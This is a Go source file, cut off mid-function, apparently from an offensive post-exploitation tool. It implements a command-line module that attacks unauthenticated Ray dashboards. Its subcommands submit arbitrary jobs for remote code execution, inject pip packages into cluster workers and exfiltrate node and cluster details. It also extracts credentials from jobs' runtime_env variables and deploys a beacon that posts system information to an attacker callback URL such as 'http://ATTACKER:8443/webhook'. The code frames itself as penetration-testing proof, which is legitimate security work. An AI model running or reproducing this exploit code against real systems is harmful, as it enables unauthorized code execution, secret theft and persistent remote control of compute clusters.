package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/spf13/cobra"

	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	"github.com/professor-moody/aipostex/pkg/exploit/ray"
	"github.com/professor-moody/aipostex/pkg/payloads"
	"github.com/professor-moody/aipostex/pkg/report"
	"github.com/professor-moody/aipostex/pkg/stringutil"
)

var (
	rayTarget         string
	rayHeaders        []string
	rayEntrypoint     string
	rayRuntimeEnvJSON string
	rayJobID          string
	rayPayloadPreset  string
	rayBeaconInterval int
	rayPipPackage     string
)

var rayClientFactory = newRayClient

var rayCmd = &cobra.Command{
	Use:   "ray",
	Short: "Enumerate and exploit Ray dashboards",
	Long: `Enumerate Ray dashboard metadata and job submission surfaces, list visible jobs,
inspect bounded job details, or submit a bounded exploit job.

Submitting a Ray job requires --force-exploit.`,
	Example: strings.Join([]string{
		formatCommandExample("ray --target http://127.0.0.1:8265 enum"),
		formatCommandExample("ray --target http://127.0.0.1:8265 jobs"),
		formatCommandExample("ray --target http://127.0.0.1:8265 job-logs --job-id job-1"),
		formatCommandExample("ray --target http://127.0.0.1:8265 job-artifacts --job-id job-1"),
		formatCommandExample("ray --target http://127.0.0.1:8265 submit --payload-preset env-disclosure --force-exploit"),
		formatCommandExample("ray --target http://127.0.0.1:8265 runtime-env --job-id job-1 --force-exploit"),
	}, "\n"),
}

var rayEnumCmd = &cobra.Command{
	Use:     "enum",
	Short:   "Enumerate Ray dashboard metadata",
	Example: formatCommandExample("ray --target http://127.0.0.1:8265 enum"),
	RunE:    runRayEnum,
}

var rayJobsCmd = &cobra.Command{
	Use:     "jobs",
	Short:   "List visible Ray jobs",
	Example: formatCommandExample("ray --target http://127.0.0.1:8265 jobs"),
	RunE:    runRayJobs,
}

var rayJobLogsCmd = &cobra.Command{
	Use:     "job-logs",
	Short:   "Read bounded job detail or logs for a Ray job",
	Example: formatCommandExample("ray --target http://127.0.0.1:8265 job-logs --job-id job-1"),
	RunE:    runRayJobLogs,
}

var rayJobArtifactsCmd = &cobra.Command{
	Use:     "job-artifacts",
	Short:   "Extract bounded artifact or log references from a Ray job",
	Example: formatCommandExample("ray --target http://127.0.0.1:8265 job-artifacts --job-id job-1"),
	RunE:    runRayJobArtifacts,
}

var raySubmitCmd = &cobra.Command{
	Use:   "submit",
	Short: "Submit a bounded exploit job",
	Long: `Submit a bounded exploit job through the Ray jobs API.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("ray --target http://127.0.0.1:8265 submit --payload-preset env-marked --force-exploit"),
	RunE:    runRaySubmit,
}

var rayPipInjectCmd = &cobra.Command{
	Use:   "pip-inject",
	Short: "Prove pip injection via runtime_env",
	Long: `Submit a job with runtime_env.pip containing a test package, proving that
arbitrary pip packages can be injected into cluster workers.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("ray --target http://127.0.0.1:8265 pip-inject --force-exploit"),
	RunE:    runRayPipInject,
}

var rayClusterInfoCmd = &cobra.Command{
	Use:   "cluster-info",
	Short: "Exfiltrate cluster resource and node information",
	Long: `Submit a job that collects ray.cluster_resources() and ray.nodes() output,
proving full cluster visibility including node IPs, CPU/GPU counts, and alive status.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("ray --target http://127.0.0.1:8265 cluster-info --force-exploit"),
	RunE:    runRayClusterInfo,
}

var rayRuntimeEnvCmd = &cobra.Command{
	Use:     "runtime-env",
	Short:   "Validate bounded runtime_env submission or injection surfaces",
	Example: formatCommandExample("ray --target http://127.0.0.1:8265 runtime-env --job-id job-1 --force-exploit"),
	RunE:    runRayRuntimeEnv,
}

var rayBeaconCmd = &cobra.Command{
	Use:   "beacon",
	Short: "Submit a beacon job that calls back to --callback-url on interval (requires --force-exploit)",
	Long: `Submit a Ray job with a Python beacon payload that periodically POSTs system
information to the specified --callback-url webhook. The beacon persists until
the job is killed or the interval expires.

Requires --force-exploit.`,
	Example: formatCommandExample("ray --target http://127.0.0.1:8265 beacon --callback-url http://ATTACKER:8443/webhook --force-exploit"),
	RunE:    runRayBeacon,
}

func init() {
	rayCmd.PersistentFlags().StringVarP(&rayTarget, "target", "t", "", "Ray dashboard URL (required)")
	rayCmd.PersistentFlags().StringSliceVar(&rayHeaders, "header", nil, "Additional HTTP header(s) in 'Key: Value' format")

	rayJobLogsCmd.Flags().StringVar(&rayJobID, "job-id", "", "Job ID to inspect")
	rayJobArtifactsCmd.Flags().StringVar(&rayJobID, "job-id", "", "Job ID to inspect for artifact or log references")

	raySubmitCmd.Flags().StringVar(&rayEntrypoint, "entrypoint", "", "Entrypoint command for the bounded exploit job")
	raySubmitCmd.Flags().StringVar(&rayRuntimeEnvJSON, "runtime-env-json", "", "Optional runtime_env JSON payload")
	raySubmitCmd.Flags().StringVar(&rayPayloadPreset, "payload-preset", "env-disclosure", "Built-in bounded payload preset (env-disclosure, env-marked, fs-survey, runtime-survey, beacon, python-print)")

	rayRuntimeEnvCmd.Flags().StringVar(&rayJobID, "job-id", "", "Existing job ID used to anchor the runtime-env takeover workflow")
	rayRuntimeEnvCmd.Flags().StringVar(&rayRuntimeEnvJSON, "runtime-env-json", "", "Optional runtime_env JSON payload for the bounded runtime-env proof")

	rayBeaconCmd.Flags().IntVar(&rayBeaconInterval, "interval", 30, "Beacon interval in seconds")
	rayPipInjectCmd.Flags().StringVar(&rayPipPackage, "package", "", "Pip package spec to inject into the job's runtime_env (default: a harmless probe package)")

	rayCmd.AddCommand(rayEnumCmd, rayJobsCmd, rayJobLogsCmd, rayJobArtifactsCmd, raySubmitCmd, rayRuntimeEnvCmd, rayPipInjectCmd, rayClusterInfoCmd, rayBeaconCmd)
}

func runRayEnum(cmd *cobra.Command, args []string) error {
	client, headers, err := rayClientFactory()
	if err != nil {
		return err
	}
	info, err := client.DashboardInfo()
	if err != nil {
		return fmt.Errorf("enumerating ray dashboard: %w", err)
	}
	jobs, jobsErr := client.ListJobs()
	jobIDs := make([]string, 0, len(jobs))
	for _, job := range jobs {
		jobIDs = append(jobIDs, job.ID)
	}

	findings := []report.Finding{
		newExploitFinding(
			report.SourceRay,
			rayTarget,
			"Ray dashboard enumerated",
			report.SeverityInfo,
			fmt.Sprintf("Enumerated Ray dashboard metadata (version=%s, jobs_api=%t, session=%s)", safeLabel(info.Version), info.JobsAPIReachable, safeLabel(info.SessionName)),
			map[string]interface{}{
				"module":              "ray",
				"action":              "enum",
				"mutating":            false,
				"provider":            "ray",
				"headers":             headerNames(headers),
				"version":             info.Version,
				"python_version":      info.PythonVersion,
				"session_name":        info.SessionName,
				"cluster_id":          info.ClusterID,
				"jobs_api_reachable":  info.JobsAPIReachable,
				"has_existing_jobs":   info.HasExistingJobs,
				"runtime_env_capable": info.RuntimeEnvCapable,
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "recon", "reachable", "ray-enum", "dashboard")
	summaryPlan := buildRayEnumWorkflowPlan(rayTarget, info.JobsAPIReachable, jobIDs)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
	if info.JobsAPIReachable {
		finding := newExploitFinding(
			report.SourceRay,
			rayTarget,
			"Ray jobs API reachable",
			report.SeverityHigh,
			"Ray jobs API is reachable through the dashboard, enabling job enumeration, log review, or proof submission workflows.",
			map[string]interface{}{
				"module":   "ray",
				"action":   "enum",
				"mutating": false,
				"provider": "ray",
				"endpoint": "/api/jobs/",
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "ray-enum", "jobs-api")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildRayEnumWorkflowPlan(rayTarget, true, jobIDs))
		finding.Evidence = fmt.Sprintf("version=%s\nsession=%s\ncluster_id=%s\npython_version=%s\nruntime_env_capable=%t\nhas_existing_jobs=%t\njob_ids=%s",
			info.Version, info.SessionName, info.ClusterID, info.PythonVersion,
			info.RuntimeEnvCapable, info.HasExistingJobs, strings.Join(jobIDs, ","))
		findings = append(findings, finding)
	}
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "ray",
		Action:              "enum",
		ResourcesEnumerated: 1,
		PartialFailures:     countNonNilErrors(jobsErr),
		Mutating:            false,
		WorkflowFailures:    countNonNilErrors(jobsErr),
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

func runRayJobs(cmd *cobra.Command, args []string) error {
	client, _, err := rayClientFactory()
	if err != nil {
		return err
	}
	jobs, err := client.ListJobs()
	if err != nil {
		return fmt.Errorf("listing ray jobs: %w", err)
	}
	findings := []report.Finding{
		newExploitFinding(
			report.SourceRay,
			rayTarget,
			"Ray jobs surface enumerated",
			report.SeverityHigh,
			fmt.Sprintf("Enumerated %d visible Ray job(s)", len(jobs)),
			map[string]interface{}{
				"module":    "ray",
				"action":    "jobs",
				"mutating":  false,
				"provider":  "ray",
				"job_count": len(jobs),
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "access", "reachable", "ray-jobs", "jobs-api")
	namedJobIDs := make([]string, 0, len(jobs))
	otherJobIDs := make([]string, 0, len(jobs))
	for _, job := range jobs {
		jobName := job.ID
		named := false
		if job.Metadata != nil {
			if name, ok := job.Metadata["name"].(string); ok && name != "" {
				jobName = name
				named = true
			}
		}
		if named {
			namedJobIDs = append(namedJobIDs, job.ID)
		} else {
			otherJobIDs = append(otherJobIDs, job.ID)
		}
		meta := map[string]interface{}{
			"module":     "ray",
			"action":     "jobs",
			"mutating":   false,
			"provider":   "ray",
			"job_id":     job.ID,
			"status":     job.Status,
			"entrypoint": job.Entrypoint,
		}
		if job.Metadata != nil {
			meta["job_metadata"] = job.Metadata
			if name, ok := job.Metadata["name"].(string); ok && name != "" {
				meta["name"] = name
			}
		}
		finding := newExploitFinding(
			report.SourceRay,
			rayTarget,
			fmt.Sprintf("Ray job discovered: %s", safeLabel(jobName)),
			report.SeverityInfo,
			fmt.Sprintf("Visible Ray job %s is in status %s", safeLabel(jobName), safeLabel(job.Status)),
			meta,
		)
		finding.Evidence = job.Message
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "ray-jobs", "job-id")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildRayJobWorkflowPlan(rayTarget, job.ID))
		findings = append(findings, finding)

		envFindings := extractRayEnvVarFindings(rayTarget, jobName, job.RuntimeEnv)
		findings = append(findings, envFindings...)
	}
	jobIDs := append(namedJobIDs, otherJobIDs...)
	summaryPlan := buildRayJobsSummaryWorkflowPlan(rayTarget, jobIDs)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
	var jobLines []string
	for _, j := range jobs {
		jobLines = append(jobLines, fmt.Sprintf("%s: status=%s entrypoint=%s", j.ID, j.Status, j.Entrypoint))
	}
	findings[0].Evidence = strings.Join(jobLines, "\n")
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "ray",
		Action:              "jobs",
		ResourcesEnumerated: len(jobs),
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

func runRayJobLogs(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(rayJobID) == "" {
		return missingFlagError("job-id", formatCommandExample("ray --target http://127.0.0.1:8265 job-logs --job-id job-1"))
	}
	client, _, err := rayClientFactory()
	if err != nil {
		return err
	}
	detail, err := client.JobDetails(rayJobID, 128*1024)
	if err != nil {
		return fmt.Errorf("reading ray job detail: %w", err)
	}
	evidence := strings.TrimSpace(detail.Logs)
	if evidence == "" {
		evidence = strings.TrimSpace(detail.Message)
	}
	landed := classifyRayLogLanded(evidence)
	description := fmt.Sprintf("Retrieved bounded Ray job detail for %s (status=%s)", safeLabel(rayJobID), safeLabel(detail.Status))
	switch landed {
	case "execution-confirmed":
		description = fmt.Sprintf("Retrieved Ray job detail for %s with execution-confirming output markers", safeLabel(rayJobID))
	case "read-confirmed":
		description = fmt.Sprintf("Retrieved Ray job detail for %s with readable path or runtime disclosure", safeLabel(rayJobID))
	}
	finding := newExploitFinding(
		report.SourceRay,
		rayTarget,
		fmt.Sprintf("Ray job detail readable: %s", safeLabel(rayJobID)),
		report.SeverityHigh,
		description,
		map[string]interface{}{
			"module":     "ray",
			"action":     "job-logs",
			"mutating":   false,
			"provider":   "ray",
			"job_id":     detail.ID,
			"status":     detail.Status,
			"entrypoint": detail.Entrypoint,
		},
	)
	finding.Evidence = evidence
	if detail.Truncated {
		finding.Metadata["evidence_truncated"] = true
		finding.Metadata["evidence_limit_bytes"] = int64(128 * 1024)
	}
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", landed, "ray-job-logs", "job-logs")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildRayLogWorkflowPlan(rayTarget, rayJobID))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "ray",
		Action:              "job-logs",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{buildRayLogWorkflowPlan(rayTarget, rayJobID)},
	})
}

func runRayJobArtifacts(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(rayJobID) == "" {
		return missingFlagError("job-id", formatCommandExample("ray --target http://127.0.0.1:8265 job-artifacts --job-id job-1"))
	}
	client, _, err := rayClientFactory()
	if err != nil {
		return err
	}
	detail, err := client.JobDetails(rayJobID, 128*1024)
	if err != nil {
		return fmt.Errorf("reading ray job detail: %w", err)
	}
	raw := strings.TrimSpace(detail.Logs + "\n" + detail.Message)
	fileRefs := extractFileReferences(raw)
	consoleEvidence := joinPreview(fileRefs, 5)
	if consoleEvidence == "" {
		consoleEvidence = stringutil.BoundedPreview(raw, 140)
	}
	finding := newExploitFinding(
		report.SourceRay,
		rayTarget,
		fmt.Sprintf("Ray job artifact references correlated: %s", safeLabel(rayJobID)),
		report.SeverityHigh,
		fmt.Sprintf("Correlated %d bounded file or artifact reference(s) from Ray job %s", len(fileRefs), safeLabel(rayJobID)),
		map[string]interface{}{
			"module":        "ray",
			"action":        "job-artifacts",
			"mutating":      false,
			"provider":      "ray",
			"job_id":        detail.ID,
			"status":        detail.Status,
			"entrypoint":    detail.Entrypoint,
			"artifact_refs": strings.Join(fileRefs, ","),
		},
	)
	finding.Evidence = raw
	if detail.Truncated {
		finding.Metadata["evidence_truncated"] = true
		finding.Metadata["evidence_limit_bytes"] = int64(128 * 1024)
	}
	if consoleEvidence != "" {
		finding.Metadata["console_evidence"] = consoleEvidence
	}
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "read-confirmed", "ray-job-artifacts", "job-artifacts")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildRayLogWorkflowPlan(rayTarget, rayJobID))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "ray",
		Action:              "job-artifacts",
		ResourcesEnumerated: len(fileRefs),
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{buildRayLogWorkflowPlan(rayTarget, rayJobID)},
	})
}

// raySubmitWait bounds how long `ray submit` polls the submitted job for a
// terminal state before falling back to "submission-accepted". Var so tests can
// shorten it.
var raySubmitWait = 30 * time.Second

func runRaySubmit(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("ray submit"); err != nil {
		return err
	}
	entrypoint, err := resolveRayEntrypoint()
	if err != nil {
		return err
	}

	// If --callback-url is an HTTP webhook, wrap entrypoint to beacon back.
	if isHTTPCallbackURL(cfg.CallbackURL) {
		entrypoint = wrapEntrypointWithCallback(entrypoint, cfg.CallbackURL, "ray", "submit")
	}

	client, _, err := rayClientFactory()
	if err != nil {
		return err
	}
	runtimeEnv, err := ray.ParseRuntimeEnv(rayRuntimeEnvJSON)
	if err != nil {
		return err
	}
	result, err := client.SubmitJob(entrypoint, runtimeEnv)
	if err != nil {
		return fmt.Errorf("submitting ray job: %w", err)
	}

	// The submitted entrypoint runs on a cluster worker. Poll the job to a terminal
	// state and read its stdout so we can confirm execution (and show the output)
	// rather than only reporting that the job was accepted.
	detail, _ := client.WaitForJob(result.JobID, raySubmitWait, 2*time.Second)
	status := result.Status
	if strings.TrimSpace(detail.Status) != "" {
		status = detail.Status
	}
	logs := strings.TrimSpace(detail.Logs)
	executed := strings.EqualFold(strings.TrimSpace(status), "SUCCEEDED")

	surface := newExploitFinding(
		report.SourceRay,
		rayTarget,
		"Ray job submission surface exposed",
		report.SeverityHigh,
		"Ray accepted a job submission request through the unauthenticated jobs API.",
		map[string]interface{}{
			"module":         "ray",
			"action":         "submit",
			"mutating":       true,
			"provider":       "ray",
			"endpoint":       "/api/jobs/",
			"entrypoint":     entrypoint,
			"payload_preset": rayPayloadPreset,
		},
	)
	surface.Metadata = applyStageLanded(surface.Metadata, "access", "influenced", "ray-submit", "jobs-api", "submit")
	surface.Evidence = fmt.Sprintf("endpoint=/api/jobs/\nentrypoint=%s\npayload_preset=%s", entrypoint, rayPayloadPreset)

	var job report.Finding
	if executed {
		job = newExploitFinding(
			report.SourceRay,
			rayTarget,
			fmt.Sprintf("Ray remote code execution confirmed: job %s ran on a worker", safeLabel(result.JobID)),
			report.SeverityCritical,
			fmt.Sprintf("Ray scheduled and EXECUTED the submitted entrypoint on a cluster worker node (job %s, %s) — unauthenticated remote code execution. The job's stdout is captured below.", safeLabel(result.JobID), safeLabel(status)),
			map[string]interface{}{
				"module":         "ray",
				"action":         "submit",
				"mutating":       true,
				"provider":       "ray",
				"job_id":         result.JobID,
				"status":         status,
				"entrypoint":     entrypoint,
				"payload_preset": rayPayloadPreset,
				"executed":       true,
				"evidence_full":  true,
			},
		)
		job.Metadata = applyStageLanded(job.Metadata, "own", "execution-confirmed", "ray-submit", "remote-code-execution")
		if logs != "" {
			job.Evidence = fmt.Sprintf("job_id=%s status=%s\nentrypoint=%s\noutput:\n%s", result.JobID, status, entrypoint, logs)
		} else {
			job.Evidence = fmt.Sprintf("job_id=%s status=%s\nentrypoint=%s\n(no stdout captured)", result.JobID, status, entrypoint)
		}
	} else {
		job = newExploitFinding(
			report.SourceRay,
			rayTarget,
			fmt.Sprintf("Ray job accepted: %s", safeLabel(result.JobID)),
			report.SeverityHigh,
			fmt.Sprintf("Ray accepted job %s (status %s); execution was not confirmed within %s. Job log output (if any) is shown below — re-run, or pull `ray --target %s job-logs --job-id %s`, to confirm.", safeLabel(result.JobID), safeLabel(status), raySubmitWait, rayTarget, safeLabel(result.JobID)),
			map[string]interface{}{
				"module":         "ray",
				"action":         "submit",
				"mutating":       true,
				"provider":       "ray",
				"job_id":         result.JobID,
				"status":         status,
				"entrypoint":     entrypoint,
				"payload_preset": rayPayloadPreset,
				"executed":       false,
				"evidence_full":  true,
			},
		)
		job.Metadata = applyStageLanded(job.Metadata, "impact", "submission-accepted", "ray-submit", "jobs-api")
		job.Evidence = fmt.Sprintf("job_id=%s status=%s\nentrypoint=%s", result.JobID, status, entrypoint)
		if logs != "" {
			job.Evidence += "\noutput:\n" + logs
		}
	}

	submitPlan := buildRaySubmitWorkflowPlan(rayTarget, result.JobID)
	job.Metadata = attachWorkflowToMetadata(job.Metadata, submitPlan)
	return writeExploitFindingsWithSummary([]report.Finding{surface, job}, &exploitSummary{
		Module:              "ray",
		Action:              "submit",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{submitPlan},
	})
}

func runRayRuntimeEnv(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("ray runtime-env"); err != nil {
		return err
	}
	client, _, err := rayClientFactory()
	if err != nil {
		return err
	}
	runtimeEnv, err := ray.ParseRuntimeEnv(rayRuntimeEnvJSON)
	if err != nil {
		return err
	}
	entrypoint := "python3 -c 'import os; print(os.getenv(\"AIPOSTEX_PROOF\", \"unset\")); print(\"AIPOSTEX_RUNTIME_ENV\")'"

	// If --callback-url is an HTTP webhook, wrap entrypoint to beacon back.
	if isHTTPCallbackURL(cfg.CallbackURL) {
		entrypoint = wrapEntrypointWithCallback(entrypoint, cfg.CallbackURL, "ray", "runtime-env")
	}

	result, err := client.SubmitJob(entrypoint, runtimeEnv)
	if err != nil {
		return fmt.Errorf("submitting ray runtime_env proof: %w", err)
	}
	plan := buildRayLogWorkflowPlan(rayTarget, result.JobID)
	findings := []report.Finding{
		newExploitFinding(
			report.SourceRay,
			rayTarget,
			"Ray runtime_env submission surface accepted",
			report.SeverityHigh,
			fmt.Sprintf("Ray accepted a bounded runtime_env exploit job %s (status %s); retrieve job logs to confirm execution and runtime takeover.", safeLabel(result.JobID), safeLabel(result.Status)),
			map[string]interface{}{
				"module":        "ray",
				"action":        "runtime-env",
				"mutating":      true,
				"provider":      "ray",
				"job_id":        result.JobID,
				"status":        result.Status,
				"anchor_job_id": rayJobID,
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "access", "influenced", "ray-runtime-env", "runtime-env", "jobs-api")
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, plan)
	findings[0].Evidence = fmt.Sprintf("job_id=%s\nstatus=%s\nentrypoint=%s\nruntime_env=%s",
		result.JobID, result.Status, entrypoint, rayRuntimeEnvJSON)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "ray",
		Action:              "runtime-env",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func runRayPipInject(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("ray pip-inject"); err != nil {
		return err
	}
	client, _, err := rayClientFactory()
	if err != nil {
		return err
	}
	result, err := client.PipInjectionProof(rayPipPackage)
	if err != nil {
		return fmt.Errorf("pip injection proof: %w", err)
	}
	injectedPkg := strings.TrimSpace(rayPipPackage)
	if injectedPkg == "" {
		injectedPkg = "pip-install-test==0.0.1"
	}
	plan := buildRayLogWorkflowPlan(rayTarget, result.JobID)
	finding := newExploitFinding(
		report.SourceRay,
		rayTarget,
		"Ray pip injection surface accepted",
		report.SeverityHigh,
		fmt.Sprintf("Ray accepted a job whose runtime_env.pip requests %q — arbitrary pip packages can be injected into cluster workers. Job %s status: %s. Submission accepted; retrieve job logs to confirm the install/exec.", injectedPkg, safeLabel(result.JobID), safeLabel(result.Status)),
		map[string]interface{}{
			"module":   "ray",
			"action":   "pip-inject",
			"mutating": true,
			"provider": "ray",
			"job_id":   result.JobID,
			"status":   result.Status,
			"package":  injectedPkg,
		},
	)
	finding.Metadata = applyStageLanded(finding.Metadata, "access", "influenced", "ray-pip-inject", "runtime-env", "pip")
	finding.Evidence = fmt.Sprintf("Job %s accepted with runtime_env.pip injection surface (status: %s)", result.JobID, result.Status)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "ray",
		Action:              "pip-inject",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

// rayClusterInfoWait bounds how long cluster-info polls the submitted job for a
// terminal state before falling back to "submission-accepted". Var (not const)
// so tests can shorten it.
var rayClusterInfoWait = 30 * time.Second

func runRayClusterInfo(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("ray cluster-info"); err != nil {
		return err
	}
	client, _, err := rayClientFactory()
	if err != nil {
		return err
	}
	submit, err := client.ClusterInfoExfil()
	if err != nil {
		return fmt.Errorf("cluster info exfil: %w", err)
	}

	// Submitting a job to an unauthenticated Ray dashboard *is* remote code
	// execution on the cluster's workers. Poll the job to a terminal state and
	// read its logs so we can prove the code actually ran (and surface the
	// compute it exfiltrated) rather than only reporting "accepted".
	detail, _ := client.WaitForJob(submit.JobID, rayClusterInfoWait, 2*time.Second)
	status := submit.Status
	if strings.TrimSpace(detail.Status) != "" {
		status = detail.Status
	}
	info, executed := ray.ParseClusterInfo(detail.Logs)

	plan := buildRayLogWorkflowPlan(rayTarget, submit.JobID)

	var finding report.Finding
	if executed {
		finding = newExploitFinding(
			report.SourceRay,
			rayTarget,
			"Ray cluster takeover — unauthenticated remote code execution confirmed",
			report.SeverityCritical,
			fmt.Sprintf("Submitted a job to the Ray Job Submission API with no credentials, and Ray scheduled and EXECUTED it on a cluster worker node (job %s, %s). The demonstration payload ran arbitrary Python and reported back from inside the cluster: %s. The same primitive runs any code — this is unauthenticated remote code execution on distributed (frequently GPU) compute.", safeLabel(submit.JobID), safeLabel(status), formatClusterInfoSummary(info)),
			map[string]interface{}{
				"module":        "ray",
				"action":        "cluster-info",
				"mutating":      true,
				"provider":      "ray",
				"job_id":        submit.JobID,
				"status":        status,
				"executed":      true,
				"host":          info.Hostname,
				"user":          info.User,
				"platform":      info.Platform,
				"node_count":    info.NodeCount,
				"cpu_total":     info.CPUs,
				"gpu_total":     info.GPUs,
				"evidence_full": true,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "own", "execution-confirmed", "ray-cluster-info", "remote-code-execution", "cluster-resources")
		finding.Evidence = "Code executed on the cluster via the Ray Job Submission API (no auth). Output returned by the job:\n" + info.InfoJSON
	} else {
		finding = newExploitFinding(
			report.SourceRay,
			rayTarget,
			"Ray accepted unauthenticated job submission (remote code execution surface)",
			report.SeverityHigh,
			fmt.Sprintf("The Ray Job Submission API accepted a job with no credentials (job %s, status %s). Submitting a job to an exposed Ray dashboard runs arbitrary code on cluster workers — execution was not confirmed within %s. Re-run, or pull `ray --target %s job-logs --job-id %s`, to confirm the code ran.", safeLabel(submit.JobID), safeLabel(status), rayClusterInfoWait, rayTarget, safeLabel(submit.JobID)),
			map[string]interface{}{
				"module":   "ray",
				"action":   "cluster-info",
				"mutating": true,
				"provider": "ray",
				"job_id":   submit.JobID,
				"status":   status,
				"executed": false,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "impact", "submission-accepted", "ray-cluster-info", "remote-code-execution")
		finding.Evidence = fmt.Sprintf("Cluster info job %s submitted (status: %s); execution not confirmed within %s", submit.JobID, status, rayClusterInfoWait)
	}
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "ray",
		Action:              "cluster-info",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

// formatClusterInfoSummary renders what the cluster-info job proved on the worker
// (host identity, and a best-effort compute inventory) for the finding description.
func formatClusterInfoSummary(info ray.ClusterInfoResult) string {
	var parts []string
	if info.Hostname != "" {
		host := info.Hostname
		if info.User != "" {
			host = info.User + "@" + info.Hostname
		}
		parts = append(parts, "ran as "+host)
	}
	if info.Platform != "" {
		parts = append(parts, info.Platform)
	}
	if info.NodeCount > 0 {
		seg := fmt.Sprintf("%d node(s)", info.NodeCount)
		if info.CPUs > 0 {
			seg += fmt.Sprintf(" / %.0f CPU", info.CPUs)
		}
		if info.GPUs > 0 {
			seg += fmt.Sprintf(" / %.0f GPU", info.GPUs)
		}
		parts = append(parts, seg)
	}
	if len(parts) == 0 {
		return "code executed on a cluster worker"
	}
	return strings.Join(parts, ", ")
}

func newRayClient() (*ray.Client, http.Header, error) {
	if strings.TrimSpace(rayTarget) == "" {
		return nil, nil, missingFlagError("target", formatCommandExample("ray --target http://127.0.0.1:8265 enum"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(rayHeaders)
	if err != nil {
		return nil, nil, err
	}
	target := normalizeAndWarnTarget(rayTarget)
	rayTarget = target
	client, err := ray.NewClient(currentContext(), target, cfg.Timeout, headers)
	if err != nil {
		return nil, nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, nil, err
	}
	client.HTTPClient = httpClient
	client.ForceExploit = cfg.ForceExploit
	return client, headers, nil
}

func extractRayEnvVarFindings(target, jobName string, runtimeEnv map[string]interface{}) []report.Finding {
	if runtimeEnv == nil {
		return nil
	}
	envVars, ok := runtimeEnv["env_vars"].(map[string]interface{})
	if !ok {
		return nil
	}
	if len(envVars) == 0 {
		return nil
	}

	envStrings := stringifyRayEnvVars(envVars)
	var evidenceLines []string
	keys := make([]string, 0, len(envStrings))
	for k := range envStrings {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		evidenceLines = append(evidenceLines, fmt.Sprintf("%s=%s", k, envStrings[k]))
	}
	evidence := strings.Join(evidenceLines, "\n")
	extractedCredentials := rayRuntimeEnvCredentialMetadata(target, envStrings)
	if len(extractedCredentials) == 0 {
		return nil
	}

	finding := newExploitFinding(
		report.SourceRay,
		target,
		fmt.Sprintf("Ray job runtime_env secrets exposed: %s", safeLabel(jobName)),
		report.SeverityCritical,
		fmt.Sprintf("Extracted %d environment variable(s) from Ray job %s runtime_env — may contain credentials, API keys, or tokens", len(envVars), safeLabel(jobName)),
		map[string]interface{}{
			"module":        "ray",
			"action":        "jobs",
			"mutating":      false,
			"provider":      "ray",
			"job_name":      jobName,
			"env_var_count": len(envVars),
			"env_vars":      envStrings,
			"evidence_full": true,
		},
	)
	if len(extractedCredentials) > 0 {
		finding.Metadata["extracted_credentials"] = extractedCredentials
	}
	finding.Evidence = evidence
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "read-confirmed", "ray-jobs", "runtime-env")
	return []report.Finding{finding}
}

func stringifyRayEnvVars(envVars map[string]interface{}) map[string]string {
	out := make(map[string]string, len(envVars))
	for k, v := range envVars {
		key := strings.TrimSpace(k)
		if key == "" {
			continue
		}
		out[key] = fmt.Sprint(v)
	}
	return out
}

func rayRuntimeEnvCredentialMetadata(rayTarget string, envVars map[string]string) []interface{} {
	targets := rayRuntimeEnvServiceTargets(rayTarget, envVars)
	records := make([]interface{}, 0)
